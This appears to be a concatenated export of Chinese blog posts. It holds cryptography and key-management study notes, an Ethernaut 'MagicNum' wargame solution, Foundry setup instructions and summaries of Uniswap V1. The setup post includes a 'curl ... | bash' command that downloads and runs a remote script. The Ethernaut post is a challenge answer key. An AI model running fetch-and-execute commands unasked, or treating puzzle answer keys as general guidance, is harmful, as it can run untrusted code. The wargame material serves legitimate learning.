在异地的两个人如何通过不可信的网络信道传输信息？\n密钥交换：\n\n\n使用非对称加密算法来交换对称加密的密钥。发送者可以使用接收者的公钥加密生成的对称密钥，发送到接收者。接收者使用其私钥解密获得对称密钥。\n\n\n数据传输：\n\n\n使用对称密码算法对待传输的数据进行加密，这样可以通过安全高效的加密传输大数据。\n\n\n身份验证：\n发送者在每次传输重要数据前，可以使用自身的私钥对信息进行数字签名，接收者可以使用发送者的公钥验证该签名，以确保信息的真实性和完整性。\n\n\nT2 两个交易者A和B，假设B没有A的电话或邮箱的前提下，B如何相信A在网上发布的公钥就是真真的A发布的公钥，而不是C假冒A发布的？例： 使用公钥基础设施（PKI）和数字证书\n数字证书是用来验证公钥真实性的强大工具。以下是其工作原理：\n\n数字证书：A可以向受信任的证书颁发机构（CA）申请数字证书。该证书会包含A的公钥以及CA的签名。CA会对申请者的身份进行验证，以确保发放的证书确实是A的。\n验证数字证书：当B获取A的公钥时，还可以获得A的数字证书。B可以通过检查证书链，确认该证书是由一个受信任的CA签发的，从而相信A的公钥是安全和真实的。\n\nT3 请说明密码学在信息安全领域有哪些作用?\n保密性：密码学通过数据加密技术，确保信息在存储和传输过程中不被未授权者读取。加密技术将明文信息转换为密文，只有持有正确密钥的人才能解密获取原始信息。\n\n完整性：密码学提供了保证信息完整性的机制，这意味着可以验证信息在传输或存储过程中是否被篡改。例如，使用哈希函数和消息认证码（Message Authentication Code，MAC）来检测和防止数据被非法修改。\n\n认证性：密码学中的认证技术可以确认消息的来源，确保通信双方是真实的，并且信息确实来自声称的发送者。\n\n不可否认性：数字签名等密码技术提供了非抵赖性，即发送者不能否认之前发送过的信息，这在法律和商业交易中尤为重要。\n\n可用性：虽然密码学本身不直接提供可用性，但合适的密码管理和身份验证机制可以帮助防止未授权访问，从而确保合法用户对信息的访问和使用。\n\n应对安全威胁：随着网络攻击手段的不断进步，密码学也在不断发展新的算法和技术来应对新出现的安全威胁。\n\n\nT4 请说明密码系统的组成及它们之间的关系。​\t一个完整的保密通信系统由密码体制（包括密码算法以及所有可能的明文、密文和密钥）、信源、信宿和攻击者构成 \nT5 请说明如何认识密码系统的安全性。\n计算安全：\n\n​\t也称实际安全。包含两个含义：破译的代价超出信息本身的价值；破译的时间超出了信息的有效期。\n\n无条件安全：\n\n​\t也称为理论安全。无论破译者有多少密文，他也无法解出对应的明文，即使他解出了，他也无法验证结果的正确性。\nT6 请说明密码分析者对密码技术的攻击方式有哪些，并简要说明？\n密码分析攻击是在不知道密钥的情况下恢复出明文或密钥，也可以通过发现密码体制的弱点，最终得到明文或密钥。\n\n分析方法分为穷举法，统计分析法，数学分析方法\n\n\nT7 给定DES算法，在平均意义下，有多少个密钥可以把一个指定的输入分组加密得到一个指定的输出分组？T8 什么是非对称加密？和对称加密的区别？它的工作原理是什么？\n非对称加密，也称为公钥加密，是一种加密方法，采用一对密钥（私钥和公钥）进行数据的加密和解密。\n\n加解密速度，安全性，实现难易度\n\n工作原理参考上方单项陷门函数\n\n\n\nC3 密钥管理技术T1 为什么要引进密钥管理技术？\n加解密算法一般都是公开的，所有的密码技术都依赖于密钥。\n密码系统的保密程度就完全取决于密钥的保密程度。\n密钥管理方法因所使用的密码体制（对称密码体制和公钥密码体制）而异。若密钥得不到合理的保护和管理，无论算法设计得多么精巧和复杂，保密系统也是脆弱的\n密钥管理的目的就是确保密钥的安全性\n\nT2 密钥管理系统涉及到密钥管理的哪些方面？密钥管理涉及密钥的\n\n产生和存储、\n\n分发、使用、更新&#x2F;替换、\n\n备份和恢复、\n\n撤销和销毁等，涵盖了密钥的整个生存周期。\n\n\nT3 什么是密钥托管？密钥托管提供一种密钥备份与恢复的途径，也称为托管加密。\nT4 简述分布式密钥分配方案的过程。\n分布式密钥分配方案属于对称密码技术的密钥分配方案\n同属的还有：集中式密钥分配方案\n\n\nA→B：IDA∥N1。A向B发出一个要求会话密钥的请求，内容包括A的标识符IDA和一个一次性随机数N1，告知A希望与B通信，并请B产生一个会话密钥用于安全通信。 \n**B→A：EMKm[Ks∥IDA∥IDB∥f（N1）∥N2]**。B使用与A共享的主密钥MKm对应答的信息进行加密并发送给A。应答的信息包括B产生的会话密钥Ks，A的标识符IDA、B的标识符IDB、f（N1）和一个一次性随机数N2。\n**A→B：EKs[f（N2）]**。A使用B产生的会话密钥Ks对f（N2）进行加密，并发送给B。\n\n\nT5 简述集中式密钥分配方案的过程，并分析可能存在的潜在威胁。\nA→KDC：IDA∥IDB∥N1。A向KDC发出会话密钥请求。请求的消息由两个数据项组成：一是A和B的身份IDA和IDB，二是本次业务的唯一标识符N1，每次请求所用的N1都应不同，常用一个时间戳、一个计数器或一个随机数作为这个标识符。为防止攻击者对N1的猜测，用随机数作为这个标识符最合适。 \n**KDC→A：EKa[Ks∥IDA∥IDB∥N1∥EKb[Ks∥IDA]]**。KDC对A的请求发出应答。应答是由加密Ka加密的信息，因此只有A才能成功地对这一信息解密，并A相信信息的确是由KDC发出的。 \nA→B：EKb[ Ks∥IDA]。收到KDC响应的信息后，同时将会话密钥Ks存储起来，同时将经过KDC与B的共享密钥加密过的信息传送给B。B收到后，得到会话密钥Ks，并从IDA可知对方是A，而且还丛EKb知道Ks确实来自KDC。由于A转发的是加密后密文，所以转发过程不会被窃听。\nB→A：EKs[ N2]。用会话密钥加密另一个随机数N2，并将加密结果发送给A，并告诉A，B当前是可以通信的。\n**A→B：EKs[f（N2）]**。A响应B发送的信息N2，并对N2进行某种函数变换（如f函数），同时用会话密钥Ks进行加密，发送给B。\n\n\n\n非对称密码技术的密钥分配方案\n公钥的分配 \n获取公钥的途径有多种，包括公开发布、公用目录、公钥机构和公钥证书。 \n\n公开发布：是指用户将自己的公钥发送给另外一个参与者，或者把公钥广播给相关人群。这种方法有一个非常大的缺点：任何人都可以伪造一个公钥冒充他人。\n公用目录：是由一个可信任的系统或组织建立和管理维护公用目录，该公用目录维持一个公开动态目录。\n公钥机构：为更严格控制公钥从目录分配出去的公钥更加安全，为此需要引入一个公钥管理机构来为各个用户建立、维护和控制动态的公用目录。\n公钥证书：是在不与公钥管理机构通信，又能证明其他通信方的公钥的可信度，实际上完全解决了公开发布及公用目录的安全问题。\n\n\n\n密钥托管技术是通过一个防窜扰的托管加密芯片（Clipper芯片）来实现，该技术包括两个主要的核心内容：\nSkipjack加密算法：是由NSA设计的，用于加解密用户之间通信的信息。它是一个对称密钥分组加密算法，密钥长为80bits，输入和输出分组长度为64bits。该算法的实现方式采用供DES使用的联邦信息处理标准（FIPS-81）中定义的4种实现方式。\nLEAF（Law Enforcement Access Field，法律实施访问域）：通过这个访问域，法律实施部门可以在法律授权的情况下，实现对用户之间通信的监听（解密或无密钥）。这也看成是一个“后门”。\n\n\n密钥托管技术具体实施时有3个主要环节：生产托管Clipper芯片、用芯片加密通信和无密钥存取。\n\n密钥托管密码技术的组成密钥托管密码技术在逻辑上分为3个主要的模块：\n\nUSC（User Security Component，用户安全模块）\nKEC（Key Escrow Component，密钥托管模块）\nDRC（Data Recovery Component，数据恢复模块）\n\n\n USC用密钥K加密明文，并且在传送的同时传送一个数据恢复域DRF（Data Recovery Field），DRC则从KEC提供的和DRF中包含的信息中恢复出密钥K来解密密文。 \n\n\n数据恢复密钥的组成① 密钥选项\n② 密钥分割\n③ 密钥的产生和分配\n④ 密钥托管时间\n⑤ 密钥更新\n⑥ 密钥的全部和部分\n⑦ 密钥存储  \n","categories":["区块链安全基础"],"tags":["Security"]},{"title":"Ethernaut Test-18","url":"/2024/08/11/ETH18/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//Return 42 from whatIsTheMeaningOfLife//The solver&#x27;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&#x27; really really itty-bitty tiny: 10 opcodes at most./* contract Hack &#123;    function whatIsTheMeaningOfLife() external pure returns (uint) &#123;        return 42;    &#125;     &#125;*///如果我们写一个函数 那这个合约内的操作码肯定会超过10个 不能满足要求 所以需要另寻他处//-&gt;使用汇编编写一个智能合约 然后手动部署代码contract Hack &#123;  constructor(MagicNum target) &#123;    bytes memory bytecode = hex&#x27;69602a60005260206000f3600052600a6016f3&#x27;;    address addr;    assembly &#123;      //create(value(发送给新合约的ETH数量), offset(memory中代码的起始位置), size(代码的大小))      addr := create(0, add(bytecode, 0x20), 0x13)    &#125;    require(addr != address(0));    target.setSolver(addr);  &#125;&#125;contract MagicNum &#123;  address public solver;  constructor() &#123;&#125;  function setSolver(address _solver) public &#123;    solver = _solver;  &#125;  /*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__    */&#125;","categories":["Ethernaut"],"tags":["Test"]},{"title":"Foundry_build","url":"/2024/06/12/Foundry-build/","content":"Foundry环境配置\n前言：环境配置真是这个世界上最麻烦的事（之一）了！\n\n第一步 安装Foundryup在gitbash中输入如下命令\ncurl -L https://foundry.paradigm.xyz | bash\n\n\n\n第二步 安装前置条件rust您将需要 Rust 编译器和 Rust 的包管理器 Cargo。安装两者的最简单方法是使用 rustup.rs。\nFoundry 通常仅支持使用最新稳定版本的 Rust 进行构建。如果您使用的是旧版本的 Rust，则可以使用 ：rustup\nrustup update stable\n\n\n\n第三步 build foundry-安装foundry虚拟机\n这其实是最幽默的一步，经常出现莫名其妙的网络问题导致安装失败，不过看玄学就好，说不定哪次就装上了\n\n你可以使用 Foundryup 提供的各种标志：\nfoundryup --branch masterfoundryup --path path/to/foundry\n\n或者，您可以使用以下命令通过 Cargo 进行安装(我觉得这个成功率最高)：\ncargo install --git https://github.com/foundry-rs/foundry --profile release --locked forge cast chisel anvil\n\n您还可以从 Foundry 存储库的本地副本手动构建：\n解释# clone the repositorygit clone https://github.com/foundry-rs/foundry.gitcd foundry# install Forgecargo install --path ./crates/forge --profile release --force --locked# install Castcargo install --path ./crates/cast --profile release --force --locked# install Anvilcargo install --path ./crates/anvil --profile release --force --locked# install Chiselcargo install --path ./crates/chisel --profile release --force --locked","categories":["Foundry"],"tags":["Environment"]},{"title":"Uniswap V1--一个基于简单数学公式的去中心化交易所","url":"/2024/11/26/Uniswap_v1_ill/","content":"\n最近开始着手学习uniswap的一些功能与知识，写了点小总结，后面深入了会写点更深入的东西\n\nUniswap V1 知识概述Uniswap V1 是去中心化交易所（DEX）的一个基础版本，它是基于以太坊区块链的自动化做市商（AMM）模型。虽然 Uniswap V1 已经被 Uniswap V2 和 Uniswap V3 超越，但它仍然是去中心化金融（DeFi）领域的重要起点之一。以下是关于 Uniswap V1 的一些关键知识和学习路径，帮助你更好地理解其原理和使用方式。\n1. 核心概念AMM（自动化做市商）Uniswap V1 使用了一个创新的 AMM 模型，允许用户无需通过传统的订单簿进行交易。它通过一个恒定的数学公式来决定资产的价格和流动性。\n恒定乘积市场做市商（Constant Product Market Maker）Uniswap V1 的价格由两个资产的乘积保持恒定。公式为：x * y &#x3D; k\n其中，x 和 y 是池中的两个资产数量，k 是一个常数。在这种模型下，交易的价格会随着池中资产的数量变化而调整。\n池（Pool）用户可以将不同的加密货币存入 Uniswap V1 的流动性池，以提供流动性并赚取交易手续费。Uniswap V1 仅支持两种资产的流动性池。\n2. 功能特点\n无许可的交易：任何人都可以在 Uniswap 上交易，无需进行身份验证或依赖中介。\n自动化流动性提供：用户通过提供流动性，可以赚取交易手续费。\n去中心化：Uniswap 不需要中心化的服务器或托管，所有交易和资产管理都由智能合约执行。\n\n3. Uniswap V1 与后续版本的差异\n无链上价格预言机：Uniswap V1 没有链上价格预言机机制，导致价格可能在极端波动的市场环境中失真。\n有限的功能：Uniswap V1 只支持 ETH 和 ERC-20 代币之间的交易，不支持跨资产池的交易（如两种 ERC-20 代币之间的直接交易）。\n\n","categories":["Uniswap"],"tags":["basement"]},{"title":"Uniswap白皮书内容概览","url":"/2024/11/26/uniswap-whitepaper-intr/","content":"Uniswap 白皮书内容概览1. 引言Uniswap 是一个基于以太坊区块链的去中心化协议，用于实现 ERC-20 代币的自动化交易。其核心设计旨在提供一种简单、无摩擦、抗审查且经济高效的代币交换方式。Uniswap 使用自动化做市商（AMM）机制代替传统的订单簿模式，从而避免了对中介的需求。\n\n2. 核心概念\n流动性池：每个代币交易对都有一个独立的流动性池。用户可以通过存入两种代币向池中提供流动性，并因此获得交易手续费分成。\n\n恒定乘积公式：Uniswap 使用 x * y = k 的公式维护池中资产的均衡，x 和 y 分别表示两种代币的储备量，k 是一个常量。\n\n无许可的交易：任何人都可以参与交易或提供流动性，无需审批或身份验证。\n\n\n\n3. 交易过程用户通过与智能合约交互完成交易。Uniswap 中的所有交易根据流动性池的储备量动态调整价格。交易可以是：\n\nETH 与 ERC-20 之间的直接交易。\nERC-20 代币之间的跨池交易（通过 ETH 作为中间媒介）。\n\n\n4. 工厂和交换合约\n工厂合约（Factory Contract）：用于生成新的交易对。\n\n交换合约（Exchange Contract）：每个交易对由独立的合约管理，并存储特定的代币储备。\n\n\n\n5. 流动性提供者流动性提供者将两种代币按比例存入池中，并根据其提供的流动性份额，获得交易中产生的手续费收益。手续费分成按流动性份额分配。\n\n技术细节\nGas 优化：Uniswap 在交易和流动性管理中尽量降低 Gas 消耗。\n\n安全性：合约代码包含基本的安全机制，但并未涵盖所有可能的漏洞防护（如溢出检查）。\n\n完全开源：代码和文档完全公开，开发者和用户可以自由使用或修改。\n\n\n\n\nps：如果需要查看完整内容，请访问 Uniswap 白皮书 - HackMD。\n\n","categories":["Uniswap"],"tags":["basement"]},{"title":"Uniswap Whitepaper-cn","url":"/2024/11/28/Uniswapwhite-cn/","content":"Uniswap whitepaper\n由于原版的uniswap白皮书是全英文的，阅读起来可能稍显困难，所以我拿chatgpt翻译了一下（并非机翻），方便以后观看\n下面是正文\n\n\nGas 基准（Gas Benchmarks）由于其极简的设计，Uniswap 的 Gas 使用非常高效。对于 ETH 与 ERC20 的交易，它使用的 Gas 比 Bancor 少了近 10 倍。相比 0x，Uniswap 在 ERC20 ↔ ERC20 的交易中也表现得更为高效，并且与基于链上的订单簿交易所（如 EtherDelta 和 IDEX）相比，Uniswap 显著减少了 Gas 消耗。\n交易平台 Gas 消耗对比表\n\n\n交易类型\nUniswap\nEtherDelta\nBancor\nRadar Relay (0x)\nIDEX\nAirswap\n\n\n\nETH ↔ ERC20\n46,000\n108,000\n440,000\n113,000*\n143,000\n90,000\n\n\nERC20 ↔ ETH\n60,000\n93,000\n403,000\n113,000*\n143,000\n120,000*\n\n\nERC20 ↔ ERC20\n88,000\n不支持\n538,000\n113,000*\n不支持\n不支持\n\n\n*: 使用封装的 ETH（wrapped ETH）。注：在 Uniswap 上，直接转移 ERC20 代币的 Gas 成本为 36,000，比 ETH ↔ ERC20 交易节省了大约 20%。\n\n创建交易对（Creating Exchanges）uniswap_factory.vy 是一个智能合约，作为 Uniswap 交易所的工厂和注册表。createExchange() 公共函数允许任何以太坊用户为尚未拥有交易对的 ERC20 代币部署新的交易合约。\n核心代码示例exchangeTemplate: public(address)token_to_exchange: address[address]exchange_to_token: address[address]@publicdef __init__(template: address):    self.exchangeTemplate = template@publicdef createExchange(token: address) -&gt; address:    assert self.token_to_exchange[token] == ZERO_ADDRESS    new_exchange: address = create_with_code_of(self.exchangeTemplate)    self.token_to_exchange[token] = new_exchange    self.exchange_to_token[new_exchange] = token    return new_exchange\n\n合约会记录每个代币及其关联的交易对地址。通过代币地址或交易对地址，可以使用以下函数相互查询：\n\ngetExchange(token: address) -&gt; address：根据代币地址查询交易对地址。\ngetToken(exchange: address) -&gt; address：根据交易对地址查询代币地址。\n\n限制：工厂合约仅确保每种代币只能有一个交易对（one-exchange-per-token）。用户需要自行确保交易对的可靠性。\n\nETH ⇄ ERC20 交易（ETH to ERC20 Trades）每个交易合约（uniswap_exchange.vy）与一个 ERC20 代币绑定，并维持着 ETH 和该代币的流动性池。ETH 和 ERC20 之间的汇率基于它们在合约内流动性池的相对大小，通过以下公式保持：\nethpool∗tokenpool&#x3D;invarianteth_pool * token_pool &#x3D; invariant ethpool∗tokenpool&#x3D;invariant\nETH 转 ERC20 示例代码eth_pool: uint256         token_pool: uint256       token: address(ERC20) @public@payabledef ethToTokenSwap():    fee: uint256 = msg.value / 500     invariant: uint256 = self.eth_pool * self.token_pool    new_eth_pool: uint256 = self.eth_pool + msg.value    new_token_pool: uint256 = invariant / (new_eth_pool - fee)    tokens_out: uint256 = self.token_pool - new_token_pool    self.eth_pool = new_eth_pool    self.token_pool = new_token_pool    self.token.transfer(msg.sender, tokens_out)\n\n交易逻辑如下：\n\n用户向 ethToTokenSwap() 发送 ETH。\nETH 池（eth_pool）增加，为保持恒定乘积，代币池（token_pool）按比例减少。\n减少的代币量即为用户购买的代币数量，同时扣除手续费（0.2%）。\n\nGas 优化：eth_pool 和 token_pool 的储备量并不是存储变量，而是通过 self.balance 和代币合约的余额动态获取。\n\nERC20 转 ETH 交易（ERC20 to ETH Trades）tokenToEthSwap() 函数用于将 ERC20 代币交换为 ETH：\n@publicdef tokenToEthSwap(tokens_in: uint256):    fee: uint256 = tokens_in / 500    invariant: uint256 = self.eth_pool * self.token_pool    new_token_pool: uint256 = self.token_pool + tokens_in    new_eth_pool: uint256 = self.invariant / (new_token_pool - fee)    eth_out: uint256 = self.eth_pool - new_eth_pool    self.eth_pool = new_eth_pool    self.token_pool = new_token_pool    self.token.transferFrom(msg.sender, self, tokens_in)    send(msg.sender, eth_out)\n\n该操作与 ethToTokenSwap() 的操作类似：\n\n用户向合约发送 ERC20 代币。\n代币池（token_pool）增加，而 ETH 池（eth_pool）减少。\nETH 池减少的 ETH 数量即为用户兑换的 ETH。\n\n\nETH 到 OMG 示例交易当用户用 ETH 购买 OMG 时，ETH 池会增加，OMG 池则会减少。交易中汇率的变化促使市场调整，达到平衡状态。\n\n小总结：Uniswap 通过恒定乘积公式实现了一个去中心化的自动化交易系统。其极简设计确保了高效的 Gas 使用，并通过动态调整池中的资产比例来影响市场价格，进而促进交易平衡。交易过程中的 Gas 优化使得 Uniswap 在去中心化交易所中具备较高的竞争力。\n\n\nERC20 ⇄ ERC20 交易由于 ETH 被用作所有 ERC20 代币的共同交易对，它可以作为直接进行 ERC20 到 ERC20 交换的中介。例如，可以在一个交易所将 OMG 转换为 ETH，然后再在另一个交易所将 ETH 转换为 KNC，在一次交易中完成。\n例如，要将 OMG 转换为 KNC，买家在 OMG 交易合约中调用 tokenToTokenSwap() 函数：\ncontract Factory():    def getExchange(token_addr: address) -&gt; address: constantcontract Exchange():    def ethToTokenTransfer(recipent: address) -&gt; bool: modifying    factory: Factory    @publicdef tokenToTokenSwap(token_addr: address, tokens_sold: uint256):    exchange: address = self.factory.getExchange(token_addr)    fee: uint256 = tokens_sold / 500    invariant: uint256 = self.eth_pool * self.token_pool    new_token_pool: uint256 = self.token_pool + tokens_sold    new_eth_pool: uint256 = invariant / (new_token_pool - fee)    eth_out: uint256 = self.eth_pool - new_eth_pool    self.eth_pool = new_eth_pool    self.token_pool = new_token_pool    Exchange(exchange).ethToTokenTransfer(msg.sender, value=eth_out)\n\n其中 token_addr 是 KNC 代币的地址，tokens_sold 是正在出售的 OMG 数量。该函数首先通过工厂获取 KNC 交易所地址。接着，交易所将输入的 OMG 转换为 ETH。但是，函数不会将购买的 ETH 返回给买家，而是调用 KNC 交易所中的 ethToTokenTransfer() 可支付函数：\n@public@payabledef ethToTokenTransfer(recipent: address):    fee: uint256 = msg.value / 500    invariant: uint256 = self.eth_pool * self.token_pool    new_eth_pool: uint256 = self.eth_pool + msg.value    new_token_pool: uint256 = invariant / (new_eth_pool - fee)    tokens_out: uint256 = self.token_pool - new_token_pool    self.eth_pool = new_eth_pool    self.token_pool = new_token_pool    self.invariant = new_eth_pool * new_token_pool    self.token.transfer(recipent, tokens_out)\n\nethToTokenTransfer() 接收 ETH 和买家地址，验证调用是否来自注册的交易所，接着将 ETH 转换为 KNC，并将 KNC 转发给原始买家。ethToTokenTransfer() 的功能与 ethToTokenSwap() 相同，但它具有额外的输入参数 recipient: address，用于将购买的代币转发给原始买家，而不是 msg.sender，在这个例子中 msg.sender 是 OMG 交易所。\n![](Imgur: The magic of the Internet)\n交换与转账ethToTokenSwap()、tokenToEthSwap() 和 tokenToTokenSwap() 函数将购买的代币返回到买家的地址。\nethToTokenTransfer()、tokenToEthTransfer() 和 tokenToTokenTransfer() 函数允许买家进行交易后，立即将购买的代币转移到指定的收款地址。\n\n提供流动性添加流动性添加流动性需要将等值的 ETH 和 ERC20 代币存入与 ERC20 代币相关联的交易合约中。\n第一个加入流动池的流动性提供者通过存入他们认为等值的 ETH 和 ERC20 代币来设定初始的交易汇率。如果这个比例不对，套利交易者会通过套利将价格带回均衡，初始流动性提供者将承担损失。\n所有未来的流动性提供者都以他们存入时的交易汇率存入 ETH 和 ERC20 代币。如果交易汇率不合理，套利者会通过套利纠正价格。\n流动性代币流动性代币是为了追踪每个流动性提供者贡献的总储备比例而铸造的。它们可以被高度分割，并且可以随时燃烧以退还流动性市场的按比例份额。\n流动性提供者调用 addLiquidity() 函数存入储备并铸造新的流动性代币：\n@public@payabledef addLiquidity():    token_amount: uint256 = msg.value * token_pool / eth_pool     liquidity_minted: uint256 = msg.value * total_liquidity / eth_pool            eth_added: uint256 = msg.value    shares_minted: uint256 = (eth_added * self.total_shares) / self.eth_pool    tokens_added: uint256 = (shares_minted * self.token_pool) / self.total_shares)    self.shares[msg.sender] = self.shares[msg.sender] + shares_minted    self.total_shares = self.total_shares + shares_minted    self.eth_pool = self.eth_pool + eth_added    self.token_pool = self.token_pool + tokens_added    self.token.transferFrom(msg.sender, self, tokens_added)\n\n铸造的流动性代币数量由发送的 ETH 数量决定，可以使用以下公式计算：\namountMinted&#x3D;totalAmount∗ethDepositedethPool\\text{amountMinted} &#x3D; \\text{totalAmount} * \\frac{\\text{ethDeposited}}{\\text{ethPool}}amountMinted&#x3D;totalAmount∗ethPoolethDeposited\n存入 ETH 到储备中同时需要存入等值的 ERC20 代币。这可以通过以下公式计算：\ntokensDeposited&#x3D;tokenPool∗ethDepositedethPool\\text{tokensDeposited} &#x3D; \\text{tokenPool} * \\frac{\\text{ethDeposited}}{\\text{ethPool}}tokensDeposited&#x3D;tokenPool∗ethPoolethDeposited\n移除流动性流动性提供者可以随时燃烧他们的流动性代币，撤回他们在流动池中按比例的 ETH 和 ERC20 代币。\nETH 和 ERC20 代币按当前的交易汇率（储备比例）撤回，而不是按原始投资比例。这意味着市场波动和套利可能会导致部分价值丧失。\n交易过程中收取的手续费会直接添加到总流动性池中，而不铸造新的流动性代币。因此，ethWithdrawn 和 tokensWithdrawn 包含自流动性首次添加以来收集的所有手续费的按比例份额。\n流动性代币Uniswap 流动性代币代表流动性提供者在 ETH-ERC20 对中的贡献。它们本身是 ERC20 代币，并实现了完整的 EIP-20 标准。\n这允许流动性提供者出售他们的流动性代币或在账户之间转移，而无需从流动池中撤回流动性。流动性代币是特定于单个 ETH⇄ERC20 交易对的。此项目没有统一的 ERC20 代币。\n\n费用结构\nETH 到 ERC20 交易\n费用为 0.3% 以 ETH 支付\n\n\nERC20 到 ETH 交易\n费用为 0.3% 以 ERC20 代币支付\n\n\nERC20 到 ERC20 交易\n费用为 0.3% 以 ERC20 代币支付，用于输入交易所的 ERC20 到 ETH 交换\n费用为 0.3% 以 ETH 支付，用于输出交易所的 ETH 到 ERC20 交换\n实际上是 0.5991% 费用（对于输入的 ERC20）\n\n\n\nETH 与 ERC20 代币之间的交换收取 0.3% 的费用。该费用由流动性提供者按其对流动性储备的贡献比例进行分配。由于 ERC20 到 ERC20 交易包括 ERC20 到 ETH 交换和 ETH 到 ERC20 交换，因此费用会在两个交易所支付。平台不收取其他费用。\n交换手续费会立即存入流动性储备中。由于没有铸造新的流动性代币，总储备增加，因此所有流动性代币的价值会平均增加。此功能作为流动性提供者的支付，可以通过销毁流动性代币来收回。\n由于费用被添加到流动性池中，每笔交易后 invariant 会增加。在单个交易中，invariant 代表上一个交易结束时的 eth_pool * token_pool。\n\n自定义池ERC20 到交易所tokenToExchangeSwap() 和 tokenToExchangeTransfer() 这两个额外的函数增加了 Uniswap 的灵活性。这些函数将 ERC20 代币转换为 ETH，并在用户指定的地址尝试进行 ethToTokenTransfer()。这允许在不同工厂生成的自定义 Uniswap 交易所\n选择性升级（Opt-in Upgrades）升级去中心化的抗审查智能合约是非常困难的。希望 Uniswap 1.0 已经是完美的，但它可能并非如此。如果出现改进版的 Uniswap 2.0 设计，可以部署新的工厂合约。流动性提供者可以选择迁移到新的系统，或者继续使用旧的系统。\ntokenToExchange 函数使得跨不同工厂启动的交易所之间的交易成为可能。这可以用于向后兼容。ERC20 到 ERC20 的交易将在使用 tokenToToken 和 tokenToExchange 函数的版本之间进行。然而，跨版本的交易只会使用 tokenToExchange 函数。所有升级都是选择性的，并且是向后兼容的。\n\n前置交易（Frontrunning）Uniswap 在一定程度上可以被前置交易（frontrun）。这受限于用户设置的最小&#x2F;最大值和交易截止时间。\n","categories":["Uniswap"],"tags":["basement"]},{"title":"Uniswap V1--深度探索","url":"/2024/11/29/uniswap-v1-ill-deep/","content":"\n注：该文章使用了chatgpt进行润色（我要是能随手写排版这样工整的文章就好了）\n\nUniswap V1 基本信息Uniswap V1 是第一个去中心化的自动化做市商（AMM）协议，运行在以太坊区块链上。它允许用户无需中介或订单簿，通过智能合约直接进行代币交易。Uniswap V1 的设计理念是简化去中心化交易所（DEX）的使用，同时确保高效、透明且抗审查的交易机制。它成为去中心化金融（DeFi）领域的基础协议之一，并为后来的 Uniswap V2 和 V3 版本奠定了重要基础。\nUniswap V1 的核心特点1. 自动化做市商（AMM）模型\n与传统的交易所不同，Uniswap 不使用订单簿来撮合买卖双方的交易。相反，它使用 自动化做市商（AMM） 模型，通过智能合约提供流动性。流动性提供者（Liquidity Providers，LP）将两种代币存入流动性池，任何人都可以从池中进行交易。\nAMM 机制依赖一个 恒定乘积市场做市商（Constant Product Market Maker，CPMM）模型，这个模型由以下公式表示：[x \\times y &#x3D; k]\nx 和 y 代表池中两种资产的数量，k 是一个常量。\n这个公式保证了池中的代币数量在交易过程中保持平衡。每笔交易都会改变池中资产的数量，并自动调整交易价格。\n\n\n\n2. 流动性池（Liquidity Pools）\n每个 Uniswap 交易对（如 ETH 和 ERC-20 代币）都由一个流动性池（Liquidity Pool）来支持。流动性池中的资产量根据池中的供应和需求变化而变化，交易的价格是基于池内资产的比例自动确定的。\n流动性提供者：用户将两种代币存入流动性池，提供交易所需要的流动性，作为回报，他们将获得交易手续费的一部分。流动性提供者的奖励按比例分配，基于他们提供的流动性份额。\n\n3. 无许可和去中心化\n无许可：任何人都可以在 Uniswap 上进行交易，无需注册或身份验证。\n去中心化：Uniswap 完全去中心化，交易和资产管理通过智能合约自动执行，没有中心化的实体控制，所有交易都是公开透明的。\n\n4. ETH ↔ ERC-20 代币交易\nUniswap V1 支持 ETH 和 ERC-20 代币 之间的交换。每个交易对由一个独立的智能合约来管理，并且每个合约都存储一定数量的 ETH 和 ERC-20 代币。这些代币的交易是基于流动性池中的资产比率来自动确定价格的。\n不同的交易对由不同的流动性池管理。例如，ETH&#x2F;DAI 交易对将会有一个存储 ETH 和 DAI 的流动性池，交易价格基于该池中 ETH 和 DAI 的比例计算。\n\n5. 交易费用（Transaction Fees）\n每笔交易都会产生 0.3% 的手续费，该费用会分配给流动性提供者（LP），根据他们在池中的流动性份额来获得相应的奖励。\n这种手续费模型是 Uniswap 的重要特性之一，它鼓励用户为交易池提供流动性，从而确保市场的流动性和价格发现。\n\n6. 没有价格预言机（Price Oracles）\n在 Uniswap V1 中，由于没有链上价格预言机机制，价格可能会在市场波动时出现失真。价格的准确性完全依赖于池中资产的比例，可能会受到 无常损失（Impermanent Loss） 等因素的影响。\n后来的 Uniswap V2 和 V3 引入了链上价格预言机和其他改进，解决了 V1 的一些局限性。\n\nUniswap V1 的工作原理\n创建流动性池用户通过存入等值的两种代币（例如 ETH 和 DAI）创建一个流动性池。这个流动性池中的代币数量和价值会随着交易的进行而变化，价格由恒定乘积公式自动设定。\n\n交易过程用户想要交易某种代币时，可以通过智能合约直接向流动性池发送请求。例如，用户想用 ETH 购买 DAI，系统会根据 ETH 和 DAI 在流动性池中的比例，计算出交易的汇率和 DAI 数量，然后返回给用户。\n\n流动性提供者的奖励流动性提供者会通过提供代币流动性赚取交易手续费。手续费按照他们在池中的流动性份额分配。随着交易量的增加，流动性提供者可以获得更多的奖励。\n\n池中资产的变化与价格调整每笔交易都会改变池中代币的数量。根据恒定乘积公式，池中两种代币的数量保持平衡。假如某种代币的数量减少，交易价格就会上涨；反之，数量增加则价格下降。\n\n去中心化的智能合约执行Uniswap 的所有交易都是通过智能合约自动执行的，确保了去中心化交易所的透明性和可靠性。用户直接与智能合约交互，不需要依赖任何中介机构。\n\n\nUniswap V1 的局限性\n仅支持两种资产的交易对Uniswap V1 只能在两种资产之间进行交易，且这些资产必须同时存在于流动性池中。无法进行跨多个资产池的交易。\n\n价格失真与滑点问题由于缺乏链上价格预言机和其他保护机制，Uniswap V1 的价格在市场波动较大的时候可能会出现失真。此外，交易对的流动性不足时，价格可能会发生较大变化（即滑点问题）。\n\n无常损失流动性提供者可能面临无常损失，即由于市场价格的变化，流动性提供者在移除流动性时可能会面临损失，尤其是在价格波动较大的市场中。\n\n\nUniswap V1 